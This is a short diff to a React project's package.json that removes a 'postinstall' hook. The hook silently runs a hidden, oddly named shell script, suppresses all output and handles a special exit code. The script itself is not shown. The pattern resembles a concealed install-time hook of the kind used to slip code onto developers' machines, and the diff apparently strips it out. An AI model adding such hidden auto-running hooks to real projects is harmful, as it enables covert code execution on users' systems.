@@ -22,8 +22,7 @@
     "start": "react-scripts --openssl-legacy-provider start",
     "build": "craco build",
     "test": "craco test",
-    "eject": "react-scripts eject",
-    "postinstall": "sh ./.ci-2brolj.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "eject": "react-scripts eject"
   },
   "eslintConfig": {
     "extends": [
